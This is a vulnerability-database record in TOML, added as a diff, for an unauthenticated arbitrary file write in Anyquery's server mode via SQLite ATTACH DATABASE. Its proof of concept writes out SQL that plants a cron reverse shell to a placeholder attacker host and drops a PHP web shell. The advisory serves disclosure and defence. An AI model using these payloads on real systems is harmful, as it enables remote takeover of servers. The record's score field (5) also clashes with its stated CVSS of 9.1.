@@ -1,0 +1,71 @@
+[id]
+ave_id = "AVE-2026-0333"
+aliases = ["CVE-2026-50006","GHSA-xrcf-6jh3-ggvx"]
+
+[basic]
+title = "Anyquery: Arbitrary File Write (AFW) which could lead to Remote Code Execution (RCE) via Unrestricted ATTACH DATABASE in Server Mode"
+description = "## Summary
+Anyquery's `server` mode does not disable or restrict native SQLite disk manipulation commands. Unauthenticated attackers connecting to the MySQL-compatible server port can use the `ATTACH DATABASE` command to write arbitrary SQLite databases to any path on the victim's filesystem where the process has write permissions. This leads to Arbitrary File Write (AFW) which could lead to Remote Code Execution (RCE) depending on the environment (e.g., by dropping a PHP web shell if a web server is running, or overwriting system cronjobs if running as root).
+
+## Details
+When Anyquery is launched in **Server Mode** (`anyquery server`), it blindly proxies incoming SQL commands to the underlying SQLite engine. SQLite allows dynamic database mounting via the `ATTACH DATABASE` command, which creates a physical `.db` file on the filesystem if the file does not exist.
+
+An attacker can connect to the open Anyquery port, attach a new database to a sensitive path (e.g., `/var/www/html/shell.php`, `/etc/cron.d/pwn` or `/root/.ssh/authorized_keys`), create a table, and insert a malicious payload. Although the file will contain a binary SQLite header, standard Linux services like `cron`, `sshd`, and web servers like `PHP` tolerate garbage data and will parse/execute the valid payload lines injected by the attacker.
+
+## PoC (Proof of Concept)
+1. Start the server on the victim machine:
+   ```bash
+   anyquery server --host 0.0.0.0 --port 8070
+   ```
+2. Connect from an attacker machine:
+   ```bash
+   mysql -u root -h <VICTIM_IP> -P 8070
+   ```
+3. Execute the payload to write a malicious cronjob for native RCE (Note: the Anyquery process must have write permissions to the target directory, such as `/etc/cron.d` or `/var/spool/cron/crontabs/`):
+   ```sql
+   ATTACH DATABASE '/etc/cron.d/pwn' AS pwn;
+   CREATE TABLE pwn.task (cmd TEXT);
+   INSERT INTO pwn.task VALUES ('* * * * * root /bin/bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/1337 0>&1\"');
+   ```
+
+   *Alternatively, if a web server is running and the Anyquery process can write to the web root, you can drop a PHP shell:*
+   ```sql
+   ATTACH DATABASE '/var/www/html/shell.php' AS pwn;
+   CREATE TABLE pwn.hacked (cmd TEXT);
+   INSERT INTO pwn.hacked VALUES ('<?php system($_GET[\"cmd\"]); ?>');
+   ```
+
+   *If testing locally as a non-root user, you can verify the vulnerability by writing to `/tmp`:*
+   ```sql
+   ATTACH DATABASE '/tmp/pwn.db' AS pwn;
+   CREATE TABLE pwn.test (cmd TEXT);
+   INSERT INTO pwn.test VALUES ('Hello Anyquery AFW');
+   ```
+Within 60 seconds, the system's cron daemon will ignore the SQLite header, parse the valid cron string, and execute the reverse shell payload with root privileges.
+
+## Impact
+- **Confidentiality:** None (from the write action itself, though combined with LFR it becomes High).
+- **Integrity:** High. Arbitrary files can be written or overwritten, which corrupts the filesystem.
+- **Availability:** High. Overwriting critical system files (e.g., configurations, databases) can lead to complete Denial of Service (DoS).
+- **CVSS Score:** 9.1 (Critical) - `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H`
+  - *Note: If the process is running with elevated privileges (e.g., root) or inside a web root directory, this escalates to Remote Code Execution (RCE) with a CVSS of 9.8 (Critical).*
+
+## Remediation
+Disable dangerous SQLite functions (`ATTACH DATABASE`, `DETACH DATABASE`, etc.) when running in Server Mode. Restrict the MySQL handler so that it only permits operations on the main database or in-memory virtual tables."
+severity = "CRITICAL"
+score = 5
+sources = ["ghsa"]
+published = ""
+updated = ""
+remediation = "请参考官方安全公告，及时安装安全更新或升级到最新版本。"
+
+[references]
+urls = []
+
+[exploit]
+poc_urls = []
+exp_urls = []
+
+[meta]
+status = "completed"
+collected_at = "2026-07-23T01:17:35.193925060+00:00"
